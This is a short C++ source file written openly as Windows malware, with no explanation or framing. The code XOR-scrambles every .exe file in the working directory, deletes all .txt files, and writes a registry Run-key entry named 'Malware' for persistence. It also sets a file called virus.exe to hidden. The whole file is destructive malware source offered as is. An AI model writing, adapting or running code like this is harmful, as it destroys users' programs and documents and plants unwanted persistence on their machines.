#include <iostream>
#include <fstream>
#include <windows.h>
#include <string>
#include <vector>
#include <thread>

void xor_encrypt_decrypt(std::vector<char>& data, const std::string& key) {
    for (size_t i = 0; i < data.size(); ++i) {
        data[i] ^= key[i % key.size()];
    }
}

void infect_file(const std::string& file_path) {
    std::ifstream file(file_path, std::ios::binary);
    if (!file) return;

    std::vector<char> buffer((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();

    xor_encrypt_decrypt(buffer, "virus_key");

    std::ofstream out(file_path, std::ios::binary);
    out.write(buffer.data(), buffer.size());
    out.close();
}

void spread_virus() {
    WIN32_FIND_DATA find_data;
    HANDLE hFind = FindFirstFile("*.exe", &find_data);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            infect_file(find_data.cFileName);
        } while (FindNextFile(hFind, &find_data) != 0);
        FindClose(hFind);
    }
}

void execute_payload() {
    WIN32_FIND_DATA find_data;
    HANDLE hFind = FindFirstFile("*.txt", &find_data);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            DeleteFile(find_data.cFileName);
        } while (FindNextFile(hFind, &find_data) != 0);
        FindClose(hFind);
    }
}

int main() {
    spread_virus();

    execute_payload();

    HKEY hKey;
    RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
    RegSetValueEx(hKey, "Malware", 0, REG_SZ, (BYTE*)"path_to_virus.exe", strlen("path_to_virus.exe") + 1);
    RegCloseKey(hKey);

    SetFileAttributes("virus.exe", FILE_ATTRIBUTE_HIDDEN);

    return 0;
}